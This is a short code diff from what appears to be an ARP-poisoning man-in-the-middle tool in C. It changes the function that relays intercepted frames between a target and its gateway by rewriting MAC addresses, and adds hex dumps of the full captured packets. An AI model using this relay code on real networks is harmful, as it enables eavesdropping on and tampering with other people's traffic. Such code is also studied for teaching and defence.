@@ -174,7 +174,7 @@ void StopPoison(void)
     printf("\n");
 }
 
-void TransferPacket(struct ether_header *eh, u_int8_t *data, int len)
+void TransferPacket(struct ether_header *eh, u_int8_t *data, int len, u_int8_t *all_data, int len_all)
 {
     if(isPoisoning == 0){return;}
 
@@ -185,18 +185,25 @@ void TransferPacket(struct ether_header *eh, u_int8_t *data, int len)
 
     int soc = GetDeviceSoc();
 
+    printf("--- EtherTransfer ---\n");
     // 本来ならgatewayからtargetに向かうパケットなのでMACをtargetに変更する
     if(maccmp(eh->ether_dhost, t_mac) == 0)
     {
         EtherTransfer(soc, eh, t_mac, data, len);
-        print_hex(data, len);
     }
     // 本来ならtargetからgatewayに向かうパケットなのでMACをgatewayに変更する
     else if(maccmp(eh->ether_shost, t_mac) == 0)
     {
         EtherTransfer(soc, eh, g_mac, data, len);
-        print_hex(data, len);
     }
+
+    print_hex(data, len);
+    printf("\n");
+    
+    print_hex(all_data, len_all);
+
+    printf("--- EtherTransfer ---\n");
+
 }
 
 int maccmp(u_int8_t from_mac[6], u_int8_t to_mac[6])
